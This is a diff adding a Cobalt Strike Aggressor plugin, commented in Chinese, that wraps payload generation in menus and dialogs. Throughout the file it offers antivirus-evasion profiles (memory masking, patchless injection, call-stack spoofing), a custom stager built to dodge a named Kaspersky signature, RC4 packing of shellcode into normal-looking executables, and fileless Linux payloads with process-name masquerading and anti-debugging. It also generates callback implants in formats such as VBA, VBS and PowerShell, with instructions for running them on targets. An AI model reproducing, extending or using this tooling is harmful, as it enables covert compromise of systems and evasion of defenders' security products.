@@ -1,0 +1,637 @@
+# ============================================================================
+#  cs_dev :: Evasion Console  --  Cobalt Strike Aggressor 插件
+# ----------------------------------------------------------------------------
+#  菜单入口:
+#      Payloads -> Evasion Profiles (cs_dev)
+#      Payloads -> Linux Payloads (cs_dev)
+#      Help     -> cs_dev
+#
+#  Aggressor API 用法desc (按 CS 4.x 实际签名):
+#      $d = dialog("标题", %(字段 => 初值, ...), &回调函数);
+#      dialog_description($d, "desc");
+#      drow_text($d, "字段", "标签");
+#      drow_combobox($d, "字段", "标签", @("选项1","选项2"));
+#      dbutton_action($d, "按钮文字");
+#      dialog_show($d);
+#      回调内通过 $3['字段'] 读取用户输入.
+#
+#  安装: 本插件位于 <CS>/plugin/cs_dev/, 在 View -> Script Manager 里
+#        Load 选择本文件即可; 自动加载见同目录 README.md.
+# ============================================================================
+
+$CSDEV_VER = "1.0";
+
+# ---------------------------------------------------------------- 路径
+
+sub csdev_home { return "D:/Tools/1/tools/gui_other/Cobalt_Strike_4.7/plugin/cs_dev"; }
+sub csdev_tool { return csdev_home() . "/tools/" . $1; }
+sub csdev_ps   { return "powershell.exe -NoProfile -ExecutionPolicy Bypass -File \"" . $1 . "\""; }
+
+# ---------------------------------------------------------------- 视觉
+sub csdev_rule  { return "------------------------------------------"; }
+sub csdev_head  { return " cs_dev - " . $1; }
+
+# ---------------------------------------------------------------- 档案切换
+sub csdev_apply {
+    local('$p');
+
+    $p = $1;
+    println("\c9[cs_dev]\c7 切换档案 -> \c9" . $p);
+    exec(csdev_ps(csdev_tool("apply_profile.ps1")) . " -Profile " . $p);
+
+    show_message(csdev_head("免杀档案已切换") . "\n\n" .
+        " 当前档案 " . $p . "\n" .
+        csdev_rule() . "\n" .
+        "变体从预编译库直接注入, 无需 gcc/WSL\n\n" .
+        "[!] Windows kit 于客户端启动时加载,\n" .
+        "     需重启客户端生效\n\n" .
+        " Linux 载荷每次生成重编译, 选项即时生效");
+}
+
+sub csdev_custom_dialog {
+    local('$dialog');
+
+    $dialog = dialog("自定义免杀档案", %(defines => "CS_DEV_LEGACY_PATCH"), &csdev_custom_go);
+    dialog_description($dialog, "可用宏: CS_DEV_LEGACY_PATCH / CS_DEV_NO_RECYCLEDGATE / CS_DEV_NO_STACKSPOOF (comma separated)");
+    drow_text($dialog, "defines", "Defines: ");
+    dbutton_action($dialog, "应用");
+    dialog_show($dialog);
+}
+
+sub csdev_custom_go {
+    local('$defs');
+
+    $defs = $3['defines'];
+    if ($defs eq "") {
+        show_error("编译宏不能为空\n全特性请选 [对抗 / 全特性]");
+        return;
+    }
+    println("\c9[cs_dev]\c7 自定义档案: \c9" . $defs);
+    exec(csdev_ps(csdev_tool("gen_profile.ps1")) . " -Profile custom -Defines " . $defs);
+    show_message(csdev_head("自定义档案已提交") . "\n\n" .
+        " Defines " . $defs . "\n\n" .
+        "自定义档案需现场编译, 耗时较长");
+}
+
+# ---------------------------------------------------------------- 模块状态
+sub csdev_status {
+    local('$root $out $f $prof');
+
+    $root = csdev_home();
+    $prof = "未记录";
+    if (-exists ($root . "/profile.current")) { $prof = "见 profile.current"; }
+
+    $out  = csdev_head("模块状态") . "\n";
+    $out .= csdev_rule() . "\n\n";
+
+    $out .= " 变体库\n";
+    foreach $f (@("sleepmask.stealth.x64.o.enc", "injector.stealth.x64.o.enc",
+                  "udrl.stealth.x64.o.enc", "artifact64.stealth.exe")) {
+        if (-exists ($root . "/library/" . $f)) { $out .= "  o " . $f . "\n"; }
+        else                                        { $out .= "  . " . $f . "\n"; }
+    }
+
+    $out .= "\n 当前档案\n  " . $prof . "\n";
+    $out .= "\n 插件目录  " . $root . "\n";
+    $out .= " 回滚  Help -> cs_dev -> 回滚 Client Jar\n";
+
+    show_message($out);
+    println($out);
+}
+
+sub csdev_list_profiles {
+    println("\c9[cs_dev]\c7 读取变体库 ...");
+    exec(csdev_ps(csdev_tool("apply_profile.ps1")) . " -List");
+}
+
+# ---------------------------------------------------------------- Linux Payload
+#  独立 Linux 载荷: 回连配套的 c2_server.py (Python 服务端), 不进 CS session list.
+#  要回连进 CS 会话列表请用 CrossC2 菜单.
+sub csdev_linux_dialog {
+    local('$dialog');
+
+    $dialog = dialog("Linux Payload Generator",
+        %(type => "beacon", host => "", port => "8443", name => "payload.elf", dir => "",
+          link => "static", memfd => "on", maskname => "on", antidbg => "on"),
+        &csdev_linux_go);
+
+    dialog_description($dialog, "回连地址要填目标机器能访问到的地址, 仅本机自测才用 127.0.0.1; 独立载荷回连 c2_server.py, 不进 CS 会话列表");
+
+    drow_combobox($dialog, "type", "载荷类型: ", @("beacon", "stager"));
+    drow_text($dialog, "host", "C2 地址: ");
+    drow_text($dialog, "port", "C2 端口: ");
+    drow_text($dialog, "name", "输出文件名: ");
+    drow_text($dialog, "dir",  "输出目录 (留空=默认): ");
+    drow_combobox($dialog, "link", "链接方式: ", @("static", "dynamic"));
+    drow_combobox($dialog, "memfd",    "memfd 无文件: ", @("on", "off"));
+    drow_combobox($dialog, "maskname", "进程名伪装: ",   @("on", "off"));
+    drow_combobox($dialog, "antidbg",  "反调试: ",       @("on", "off"));
+    dbutton_action($dialog, "Build");
+    dialog_show($dialog);
+}
+
+sub csdev_linux_go {
+    local('$type $host $port $name $dir $extra $out $srv');
+
+    $type = $3['type'];
+    $host = $3['host'];
+    $port = $3['port'];
+    $name = $3['name'];
+    $dir  = $3['dir'];
+
+    if ($host eq "") { show_error("C2 地址不能为空\n\n要填目标机器能回连的地址 (服务端公网 / 内网 IP).\n仅当目标就是本机时才用 127.0.0.1"); return; }
+    if ($name eq "") { $name = "payload.elf"; }
+
+    $extra = "";
+    if ($3['link'] eq "dynamic")    { $extra .= " -Dynamic"; }
+    if ($3['memfd'] eq "off")       { $extra .= " -NoMemfd"; }
+    if ($3['maskname'] eq "off")    { $extra .= " -NoMaskName"; }
+    if ($3['antidbg'] eq "off")     { $extra .= " -NoAntiDebug"; }
+
+    if ($dir ne "") {
+        $out = $dir . "/" . $name;
+        $extra .= " -OutDir \"" . $dir . "\"";
+    } else {
+        $out = csdev_home() . "/build/linux/" . $name;
+    }
+
+    println("\c9[cs_dev]\c7 生成 Linux " . $type . " -> \c9" . $host . ":" . $port . $extra);
+    exec(csdev_ps(csdev_tool("gen_linux.ps1"))
+         . " -Type " . $type
+         . " -C2Host " . $host
+         . " -Port " . $port
+         . " -OutName \"" . $name . "\""
+         . $extra);
+
+    $srv = csdev_home() . "/linux/c2_server.py";
+    show_message(csdev_head("生成 Linux 载荷") . "\n\n" .
+        " 类型 " . $type . "\n" .
+        " 回连 " . $host . ":" . $port . "\n" .
+        " 输出 " . $out . "\n" .
+        " 开关 " . $extra . "\n\n" .
+        csdev_rule() . "\n" .
+        " 取用 到上面路径直接拿文件\n" .
+        " 投放 chmod +x " . $name . " && ./" . $name . "\n\n" .
+        " 服务端 独立载荷用这个接收 (不是 CS):\n" .
+        "   python " . $srv . " --port " . $port . "\n\n" .
+        " 要回连进 CS 会话列表请用:\n" .
+        "   cs_dev -> CrossC2 -> 生成 Linux Payload");
+}
+
+# ---------------------------------------------------------------- 控制台面板
+sub csdev_open_panel {
+    local('$out $prof $dot');
+
+    $prof = "未记录";
+    if (-exists (csdev_home() . "/profile.current")) { $prof = "已记录"; }
+
+    $out  = csdev_head("免杀控制台") . "\n";
+    $out .= csdev_rule() . "\n\n";
+    $out .= " 免杀档案\n";
+    $out .= "  basic     传统内存 patch + Win32 API    2384 B\n";
+    $out .= "  advanced  硬件断点 patchless + syscall  5264 B\n";
+    $out .= "  stealth   全特性 (含调用栈伪造)         5520 B\n\n";
+    $out .= " 当前生效  " . $prof . "\n\n";
+    $out .= " 已注入模块\n";
+    $out .= "  sleepmask  多算法内存掩码\n";
+    $out .= "  injector   硬件断点 patchless + RecycledGate\n";
+    $out .= "  udrl       自定义反射加载器\n";
+    $out .= "  artifact   载体模板 (1024B 锚点)\n\n";
+    $out .= csdev_rule() . "\n";
+    $out .= " 变体库 " . csdev_home() . "/library\n";
+    $out .= " 图形面板见 Help -> cs_dev -> HTML 面板";
+
+    show_message($out);
+}
+
+sub csdev_open_html {
+    local('$html');
+
+    $html = csdev_home() . "/ui/index.html";
+    if (-exists $html) {
+        println("\c9[cs_dev]\c7 用浏览器打开 HTML 面板");
+        exec("cmd /c start \"\" \"" . $html . "\"");
+    } else {
+        show_error("面板文件不存在:\n" . $html);
+    }
+}
+
+# ---------------------------------------------------------------- CrossC2 (Linux/MacOS 载荷进 CS)
+#  CrossC2 生成的载荷实现 CS beacon 协议, 回连后直接出现在 CS session list,
+#  与 Windows beacon 一样可 interact / 文件管理 / 命令执行.
+#
+#  生成器是 Linux ELF, 通过 WSL 调用:
+#    genCrossC2 [host] [port] [beaconKey] [rebind_lib] [platform] [arch] [outfile] [stager类型]
+#
+#  beacon_keys 由 teamserver 在客户端首次连接后分发到 CS 根目录, 生成前必须存在;
+#  缺少它生成的载荷无法被 teamserver 识别, 故此处先做前置校验.
+
+sub csdev_cc2_dir { return csdev_home() . "/crossc2"; }
+
+# Windows 路径 -> WSL 路径
+sub csdev_cc2_wslpath {
+    local('$p');
+    $p = $1;
+    $p = strrep($p, "\\", "/");
+    $p = strrep($p, "D:", "/mnt/d");
+    $p = strrep($p, "C:", "/mnt/c");
+    return $p;
+}
+
+sub csdev_cc2_dialog {
+    local('$dialog $keydefault');
+
+    $keydefault = csdev_home() . "/../../.cobaltstrike.beacon_keys";
+
+    $dialog = dialog("CrossC2 Payload Generator",
+        %(listener => "Listener: ", host => "", key => $keydefault, rebind => "null",
+          platform => "Linux", arch => "x64", outdir => "D:/payload_out", stype => "Stageless"),
+        &csdev_cc2_go);
+
+    dialog_description($dialog, "Listener 必须选 HTTPS 类型 (Beacon HTTPS); HTTP listener 协议不匹配, 载荷连上也不会有会话。回连地址留空则用 listener 的 host, 若 listener 的 host 是 0.0.0.0 必须在此手动填写公网 IP");
+
+    drow_listener($dialog, "listener", "Listener (必须 HTTPS): ");
+    drow_text($dialog, "host", "回连地址 (留空=用 listener 的 host): ");
+    drow_text($dialog, "key", "beacon_keys: ");
+    drow_text($dialog, "outdir", "输出目录 (Windows 路径): ");
+    drow_text($dialog, "rebind", "rebind_dynamic_lib: ");
+    drow_combobox($dialog, "platform", "平台: ", @("Linux", "MacOS", "Linux-bind", "MacOS-bind"));
+    drow_combobox($dialog, "arch", "架构: ", @("x64", "x86"));
+    drow_combobox($dialog, "stype", "载荷类型: ", @("Stageless", "shellcode", "stager"));
+    dbutton_action($dialog, "Build");
+    dialog_show($dialog);
+}
+
+sub csdev_cc2_go {
+    local('$listener $linfo $host $port $key $rebind $plat $arch $out $stype $bin $cmd $name $wslout');
+
+    $listener = $3['listener'];
+    $key      = $3['key'];
+    $rebind   = $3['rebind'];
+    $plat     = $3['platform'];
+    $arch     = $3['arch'];
+    $out      = $3['outdir'];
+    $stype    = $3['stype'];
+
+    if ($listener eq "Listener: " or $listener eq "") {
+        show_error("还没有选择 listener\n\n" .
+            "CrossC2 的回连地址与端口来自 listener 本身, 不需要手填。\n" .
+            "先在 CS 里建一个 reverse_https listener, 再回来选它。");
+        return;
+    }
+
+    $linfo = listener_info($listener);
+    $host  = $linfo['host'];
+    $port  = $linfo['port'];
+
+    # 回连地址允许手动覆盖:
+    #   listener 的 host 常被填成 0.0.0.0 (绑定通配地址), 而 CrossC2 会把这个值
+    #   原样烧进载荷当回连目标, 载荷连 0.0.0.0 永远连不上。
+    $ohost = $3['host'];
+    if ("$ohost" ne "") { $host = $ohost; }
+
+    if ("$host" eq "0.0.0.0" || "$host" eq "127.0.0.1" || "$host" eq "localhost" ||
+        "$host" eq "::" || "$host" eq "") {
+        show_error("回连地址不可用: " . $host . "\n\n" .
+            "CrossC2 会把这个值直接烧进载荷当回连目标。\n" .
+            "0.0.0.0 是绑定通配地址, 127.0.0.1 是回环地址, 载荷都连不上。\n\n" .
+            "请在「回连地址」一栏手动填写目标机器能访问到的公网 IP。");
+        return;
+    }
+
+    # 软校验: listener_info 若带 payload 字段就检查协议类型, 取不到则跳过不拦
+    # (CrossC2 载荷走 HTTPS 协议, 命中 HTTP listener 不会有会话)
+    $lp = $linfo['payload'];
+    if ("$lp" ne "" && !-isregex("https", "$lp")) {
+        show_error("选中的 listener 不是 HTTPS 类型:\n\n" .
+            $listener . "\n" . "$lp" . "\n\n" .
+            "CrossC2 载荷用 HTTPS 协议回连, HTTP listener 握手不上, 不会有会话。\n" .
+            "请在 CS 里新建一个 Beacon HTTPS listener 再选它。");
+        return;
+    }
+
+    if ("$host" eq "" or "$port" eq "") {
+        show_error("读取 listener 信息失败:\n" . $listener . "\n\n" .
+            "确认该 listener 已启动, 且其 host 填的是目标机器能访问到的地址。");
+        return;
+    }
+
+    if (!-exists $key) {
+        show_error("beacon_keys 不存在:\n" . $key . "\n\n" .
+            "这个文件由 teamserver 在你用客户端首次连上之后生成。\n" .
+            "请先启动 teamserver 并连上去, 再回来生成 CrossC2 载荷。");
+        return;
+    }
+
+    # 生成器直接用 Windows 版, 不需要 WSL: crossc2/ 目录内自带 genCrossC2.Win.exe
+    $bin = csdev_cc2_dir() . "/genCrossC2.Win.exe";
+    if (!-exists $bin) { show_error("生成器不存在:\n" . $bin); return; }
+
+    if ($out eq "") { $out = "D:/payload_out"; }
+    $out  = strrep($out, "\\", "/");
+    $name = "cc2_" . $plat . "_" . $arch;
+
+    # cmd 用反斜杠路径
+    $cdir = strrep($out, "/", "\\");
+    $cbin = strrep($bin, "/", "\\");
+    $ckey = strrep($key, "/", "\\");
+    $cfile = $cdir . "\\" . $name;
+
+    $cmd = "cmd /c mkdir \"" . $cdir . "\" 2>nul & \"" . $cbin . "\" " . $host . " " . $port
+         . " \"" . $ckey . "\" " . $rebind . " " . $plat . " " . $arch . " \"" . $cfile . "\"";
+    if ($stype ne "Stageless") { $cmd = $cmd . " " . $stype; }
+
+    println("\c9[cs_dev]\c7 CrossC2 生成: \cF" . $plat . " " . $arch . "  <- " . $listener);
+    println("\c8        回连 " . $host . ":" . $port);
+    println("\c8        " . $cmd);
+    exec($cmd);
+
+    show_message(csdev_head("CrossC2 载荷生成中") . "\n\n" .
+        " Listener " . $listener . "\n" .
+        " 回连 " . $host . ":" . $port . "\n" .
+        " 平台 " . $plat . " " . $arch . "\n" .
+        " 输出 " . $out . "/" . $name . "\n\n" .
+        csdev_rule() . "\n" .
+        " 生成完文件就在上面的目录里 (Windows 可直接访问)\n\n" .
+        " 拷到目标 Linux 执行:\n" .
+        "   chmod +x " . $name . " && ./" . $name . "\n\n" .
+        " 回连成功后自动出现在 CS 会话列表, 直接 interact");
+}
+
+# ---------------------------------------------------------------- 自研 Stager
+#  完全自写的 WinHTTP 下载器, 不含 CS 的 resources/httpsstager64.bin 任何字节。
+#  卡巴 HEUR:Trojan.Win32.CobaltStrike.gen 依赖的正是那 909 字节模板的代码模式,
+#  本方案从生成环节即不产生该特征。
+sub csdev_stager_dialog {
+    local('$dialog');
+
+    $dialog = dialog("自研 Stager 生成",
+        %(host => "", port => "8080", uri => "/aab9", ssl => "off", out => "D:/payload_out/stager.exe"),
+        &csdev_stager_go);
+
+    dialog_description($dialog, "URI 的 checksum8 决定返回哪种架构的 stage: 92=x86(MZRE 头, 32位进程才能跑), 93=x64(纯 shellcode)。x64 载荷必须用 93, 用错会 0xC0000005。协议需与 listener 实际类型一致");
+
+    drow_text($dialog, "host", "C2 地址: ");
+    drow_text($dialog, "port", "C2 端口: ");
+    drow_text($dialog, "uri",  "URI: ");
+    drow_combobox($dialog, "ssl", "协议: ", @("on", "off"));
+    drow_text($dialog, "out",  "输出 EXE: ");
+    dbutton_action($dialog, "生成");
+    dialog_show($dialog);
+}
+
+sub csdev_stager_go {
+    local('$h $p $u $s $o $cmd');
+
+    $h = $3['host'];
+    $p = $3['port'];
+    $u = $3['uri'];
+    $s = $3['ssl'];
+    $o = $3['out'];
+
+    if ($h eq "") { show_error("C2 地址不能为空\n\n要填目标机器能回连的地址"); return; }
+    if ($u eq "") { $u = "/aab9"; }
+    if ($o eq "") { $o = "D:/payload_out/stager.exe"; }
+
+    $cmd = csdev_ps(csdev_tool("build_stager.ps1"))
+         . " -Host_ \"" . $h . "\" -Port " . $p . " -Uri \"" . $u . "\" -OutFile \"" . $o . "\"";
+    if ($s eq "on") { $cmd .= " -Ssl"; }
+
+    println("\c9[cs_dev]\c7 生成自研 stager -> \cF" . $h . ":" . $p . $u);
+    exec($cmd);
+
+    show_message(csdev_head("自研 Stager") . "\n\n" .
+        " 回连 " . $h . ":" . $p . $u . "\n" .
+        " 输出 " . $o . "\n\n" .
+        csdev_rule() . "\n" .
+        " URI checksum8 决定 stage 架构 (关键)\n" .
+        "   92 -> x86 stage, 带 MZRE 头, 223302 字节\n" .
+        "   93 -> x64 stage, 纯 shellcode,   277063 字节\n" .
+        "   算法 去掉斜杠后各字符之和 对 256 取余\n" .
+        "   x64 载荷用 93, 例如 /aab9 /aac8 /aad7\n" .
+        "   填错架构会在执行时 0xC0000005\n\n" .
+        " 与 CS 内置 stager 的区别\n" .
+        "   网络栈  CS 用 WinINet, 本方案用 WinHTTP\n" .
+        "   配置    CS 用 274/314/811/898 固定偏移, 本方案加密放在尾部\n" .
+        "   模板    不含 httpsstager64.bin 的任何字节");
+}
+#  不经过 CS 的 artifact/stager 链路: 把任一 raw shellcode 用 RC4 加密后
+#  追加到自研加载器尾部, 产出 PE 结构正常的 exe。
+sub csdev_pack_dialog {
+    local('$dialog');
+
+    $dialog = dialog("自研 Payload 打包",
+        %(infile => "", outfile => "D:/payload_out/packed.exe"),
+        &csdev_pack_go);
+
+    dialog_description($dialog, "把 raw shellcode 加密后追加到自研加载器尾部; 不使用 CS 的 1024-A 锚点机制, PE 结构保持正常");
+
+    drow_text($dialog, "infile",  "输入 shellcode (raw .bin 路径): ");
+    drow_text($dialog, "outfile", "输出 EXE 路径: ");
+    dbutton_action($dialog, "打包");
+    dialog_show($dialog);
+}
+
+sub csdev_pack_go {
+    local('$in $out');
+
+    $in  = $3['infile'];
+    $out = $3['outfile'];
+
+    if ($in eq "")  { show_error("请填写输入 shellcode 路径"); return; }
+    if ($out eq "") { $out = "D:/payload_out/packed.exe"; }
+    if (!-exists $in) { show_error("输入文件不存在:\n" . $in); return; }
+
+    println("\c9[cs_dev]\c7 自研打包: \cF" . $in);
+    exec(csdev_ps(csdev_tool("pack_payload.ps1")) . " -InputFile \"" . $in . "\" -OutFile \"" . $out . "\"");
+
+    show_message(csdev_head("自研打包") . "\n\n" .
+        " 输入 " . $in . "\n" .
+        " 输出 " . $out . "\n\n" .
+        csdev_rule() . "\n" .
+        " 与 CS 原生方式的区别\n" .
+        "   payload 以 RC4 加密追加在文件尾部 (overlay)\n" .
+        "   不占用任何节区, 无 1024 个 A 锚点, 无异常零区\n" .
+        "   加载逻辑由加载器自行实现, 不调用反射加载器\n\n" .
+        " 用法\n" .
+        "   CS 里生成一个 Raw 格式 payload, 再用本菜单打包\n" .
+        "   或直接把任意 shellcode 文件拖进来打包");
+}
+sub csdev_about {
+    show_message(csdev_head("Cobalt Strike 4.7 二开套件") . "  v" . $CSDEV_VER . "\n\n" .
+        csdev_rule() . "\n\n" .
+        " 免杀模块\n" .
+        "   sleepmask  多算法内存掩码, 掩码期去执行权\n" .
+        "   injector   硬件断点 patchless + RecycledGate\n" .
+        "   udrl       自定义反射加载器\n" .
+        "   artifact   载体模板 (1024B 锚点)\n\n" .
+        " 跨平台\n" .
+        "   Linux  beacon / stager (memfd 无文件)\n\n" .
+        " 档案机制\n" .
+        "  变体预编译入库, CS 内秒级切换\n\n" .
+        csdev_rule() . "\n" .
+        " 插件目录 " . csdev_home());
+}
+
+# ---------------------------------------------------------------- 菜单
+popup payloads {
+    menu "&免杀档案 (cs_dev)" {
+        item "基础 / 兼容优先" { csdev_apply("basic"); }
+        item "进阶 / 推荐"     { csdev_apply("advanced"); }
+        item "对抗 / 全特性"   { csdev_apply("stealth"); }
+        separator();
+        item "自定义编译宏..."  { csdev_custom_dialog(); }
+        separator();
+        item "生成 Windows Payload (当前档案)" { openWindowsExecutableStageDialog(); }
+        item "自研打包 (shellcode -> EXE)" { csdev_pack_dialog(); }
+        item "Payload 生成器 (全格式)" { csdev_gen_dialog(); }
+        item "自研 Stager 生成 (无CS模板)" { csdev_stager_dialog(); }
+        item "生成 Windows Payload (全部)"     { openWindowsExecutableStageAllDialog(); }
+
+        separator();
+        item "打开控制台面板" { csdev_open_panel(); }
+        item "查看模块状态"     { csdev_status(); }
+        item "列出变体库"       { csdev_list_profiles(); }
+    }
+
+    menu "&Linux 载荷 (cs_dev)" {
+        item "CrossC2 生成 (进 CS 会话)" { csdev_cc2_dialog(); }
+        separator();
+        item "生成独立 Linux 载荷..." { csdev_linux_dialog(); }
+        separator();
+        item "载荷能力说明" {
+            show_message(csdev_head("Linux 载荷") . "\n\n" .
+                " beacon 主机载荷\n" .
+                "  shell / exec / ls / cd / pwd\n" .
+                "  download / upload / ps / kill\n" .
+                "  sleep (自适应心跳 + 指数退避)\n\n" .
+                " stager 无文件加载器\n" .
+                "  memfd_create + fexecve (无文件落地)\n" .
+                "  /dev/shm 回退路径\n" .
+                "  Process name mask [kworker/0:2]\n\n" .
+                csdev_rule() . "\n" .
+                " Anti-debug / string obfusc / RC4 session / no system() calls");
+        }
+    }
+}
+
+popup help {
+    menu "&cs_dev" {
+        item "HTML 面板 (浏览器)" { csdev_open_html(); }
+        separator();
+        item "关于 cs_dev"      { csdev_about(); }
+        item "查看模块状态"     { csdev_status(); }
+        separator();
+        item "编译并部署全部 kits" {
+            println("\c9[cs_dev]\c7 编译并部署 ...");
+            exec(csdev_ps(csdev_tool("deploy.ps1")));
+            show_message("编译部署已启动, 详见控制台输出\n\n重启客户端生效");
+        }
+        item "重建变体库" {
+            println("\c9[cs_dev]\c7 重建变体库 ...");
+            exec(csdev_ps(csdev_tool("build_library.ps1")));
+            show_message("变体库重建已启动, 详见控制台输出");
+        }
+        item "回滚客户端 jar" {
+            exec(csdev_ps(csdev_tool("apply_profile.ps1")) . " -Restore");
+            show_message("回滚已发起, 重启客户端恢复原始 jar");
+        }
+    }
+}
+
+println("\c9[cs_dev]\c7 免杀控制台 v" . $CSDEV_VER . " 已加载");
+println("\c8  入口: Payloads -> 免杀档案 (cs_dev)  |  Help -> cs_dev");
+
+# ============================================================================
+#  beacon 右键菜单 (popup beacon_bottom)
+#  与顶部 Payloads 菜单功能相同, 方便在会话上下文里直接操作
+# ============================================================================
+popup beacon_bottom {
+    menu "免杀 (cs_dev)" {
+        item "档案: 基础 / 兼容优先"   { csdev_apply("basic"); }
+        item "档案: 进阶 / 推荐"       { csdev_apply("advanced"); }
+        item "档案: 对抗 / 全特性"     { csdev_apply("stealth"); }
+        separator();
+        item "生成 Windows Payload"    { openWindowsExecutableStageDialog(); }
+        item "自研打包 (shellcode -> EXE)" { csdev_pack_dialog(); }
+        item "Payload 生成器 (全格式)" { csdev_gen_dialog(); }
+        item "自研 Stager 生成 (无CS模板)" { csdev_stager_dialog(); }
+        item "打开控制台面板"          { csdev_open_panel(); }
+        item "查看模块状态"            { csdev_status(); }
+    }
+}
+
+# 顶部菜单栏兜底入口 (部分版本 popup payloads 扩展不生效时可用)
+menubar("&cs_dev", "csdev_top");
+popup csdev_top {
+    menu "免杀档案" {
+        item "基础 / 兼容优先"   { csdev_apply("basic"); }
+        item "进阶 / 推荐"       { csdev_apply("advanced"); }
+        item "对抗 / 全特性"     { csdev_apply("stealth"); }
+        separator();
+        item "生成 Windows Payload (当前档案)" { openWindowsExecutableStageDialog(); }
+        item "自研打包 (shellcode -> EXE)" { csdev_pack_dialog(); }
+        item "Payload 生成器 (全格式)" { csdev_gen_dialog(); }
+        item "自研 Stager 生成 (无CS模板)" { csdev_stager_dialog(); }
+        separator();
+        item "打开控制台面板"    { csdev_open_panel(); }
+        item "查看模块状态"      { csdev_status(); }
+    }
+    menu "Linux 载荷" {
+        item "CrossC2 生成 (进 CS 会话)" { csdev_cc2_dialog(); }
+        item "生成独立 Linux 载荷..."    { csdev_linux_dialog(); }
+    }
+}
+
+# ---------------------------------------------------------------- Payload 生成器
+sub csdev_gen_dialog {
+    local('$dialog');
+
+    $dialog = dialog("自研 Payload 生成器",
+        %(fmt => "win-exe", host => "", port => "8443", ssl => "off", out => "D:/payload_out/payload.exe"),
+        &csdev_gen_go);
+
+    dialog_description($dialog, "全部格式均为自研实现, 不含 CS 任何组件; 回连自研服务端 c2/server.py");
+
+    drow_combobox($dialog, "fmt", "格式: ",
+        @("win-exe","win-console","win-svc","win-dll","win-raw",
+          "win-ps1","win-vba","win-vbs","linux-elf","linux-elf-dyn"));
+    drow_text($dialog, "host", "C2 地址: ");
+    drow_text($dialog, "port", "C2 端口: ");
+    drow_combobox($dialog, "ssl", "协议: ", @("off", "on"));
+    drow_text($dialog, "out",  "输出文件: ");
+    dbutton_action($dialog, "生成");
+    dialog_show($dialog);
+}
+
+sub csdev_gen_go {
+    local('$f $h $p $s $o $cmd');
+
+    $f = $3['fmt'];
+    $h = $3['host'];
+    $p = $3['port'];
+    $s = $3['ssl'];
+    $o = $3['out'];
+
+    if ($h eq "") { show_error("C2 地址不能为空"); return; }
+    if ($o eq "") { $o = "D:/payload_out/payload.exe"; }
+
+    $cmd = csdev_ps(csdev_tool("gen_payload.ps1"))
+         . " -Format " . $f . " -Host_ \"" . $h . "\" -Port " . $p . " -OutFile \"" . $o . "\"";
+    if ($s eq "on") { $cmd .= " -Ssl"; }
+
+    println("\c9[cs_dev]\c7 生成 \cF" . $f . "\c7 -> " . $h . ":" . $p);
+    exec($cmd);
+
+    show_message(csdev_head("Payload 生成") . "\n\n" .
+        " 格式 " . $f . "\n" .
+        " 回连 " . $h . ":" . $p . "\n" .
+        " 输出 " . $o . "\n\n" .
+        csdev_rule() . "\n" .
+        " win-exe / win-console / win-svc / win-dll\n" .
+        " win-raw / win-ps1 / win-vba / win-vbs\n" .
+        " linux-elf / linux-elf-dyn\n\n" .
+        " 服务端 python c2/server.py --port " . $p . "\n" .
+        " 控制台 python c2/gui.py");
+}
+
